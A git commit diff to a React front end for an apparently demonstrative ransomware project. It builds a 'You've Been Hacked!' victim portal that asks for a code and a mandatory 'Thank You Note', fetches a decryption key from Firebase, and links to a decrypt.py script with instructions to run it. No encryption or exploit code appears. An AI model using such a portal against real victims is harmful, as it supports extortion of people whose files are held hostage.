533fb16fbeb84a010482c4f6947a7c09d5e1e4d2
alanzeng17 <alanzeng17@gmail.com>
2019-12-03 11:25:01 -0600

    cleaned up pages a bit, added decrypt.py source

--- frontend/ransom/src/App.js
+++ frontend/ransom/src/App.js
@@ -1,6 +1,7 @@
 import React from 'react';
 import logo from './logo.svg';
 import './App.css';
+import { Container, Button, Paper, Typography } from '@material-ui/core';
 
 var firebase = require("firebase/app");
 require("firebase/auth");
@@ -37,13 +38,19 @@ class App extends React.Component {
       value: "temp",
       shouldShow: false,
       output: "failed",
+      text: ""
     }
     this.testClick = this.testClick.bind(this);
     this.handleChange = this.handleChange.bind(this);
+    this.handleChange2 = this.handleChange2.bind(this);
   }
 
   testClick = () => {
     // gets value based on key in input
+    if (this.state.text.length < 10) {
+      alert("Letter is too short!");
+      return;
+    }
     var database = firebase.database();
     var val = database.ref('/keys/' + this.state.value).once('value').then((snapshot) => {
       var temp = (snapshot.val());
@@ -59,26 +66,47 @@ class App extends React.Component {
   handleChange(event) {
     this.setState({value: event.target.value});
   }
+  handleChange2(event) {
+    this.setState({text: event.target.value});
+  }
   render () {
     // successful code!
     if (this.state.shouldShow) {
       return (
-        <div>
-          <p>{this.state.output}</p>
+        <div className="App">
+          <h1>Key Unlocked!</h1>
+          <p>Your decrypt key is: {this.state.output}</p>
+          <a href="https://raw.githubusercontent.com/bucktower/other-ethical-proj/master/decrypt.py">Download Here</a>
+          <h2>Instructions</h2>
+          <p>Save the above python script. In a command line terminal, run "python3 decrypt.py {this.state.output}". Make sure the folder to decrypt only contains the encrypted files.</p>
         </div>
       )
     }
     // default site
     return (
       <div className="App">
+        <Container fixed style={{paddingTop: "25px"}}>
+        <Paper>
+        <Typography variant="h5" component="h2" style={{paddingTop: "20px"}}>
+          You've Been Hacked!
+        </Typography>
         <form>
+          <br></br>
           <label>
              Code:
-            <input type="text" name="code" onChange={this.handleChange} />
+            <input type="text" name="code" onChange={this.handleChange} style={{marginLeft: "5px"}}/>
+          </label>
+          <br></br>
+          <br></br>
+          <label>
+             Thank You Note:
+            <input type="text" name="code" onChange={this.handleChange2} style={{marginLeft: "5px"}}/>
           </label>
         </form>
-        <button onClick={this.testClick}>Click Me</button>
-        <p>{this.state.value}</p>
+        <br></br>
+        <Button variant="contained" color="primary" onClick={this.testClick} style={{marginBottom: "20px"}}>Submit</Button>
+        </Paper>
+        </Container>
       </div>
     );
   }
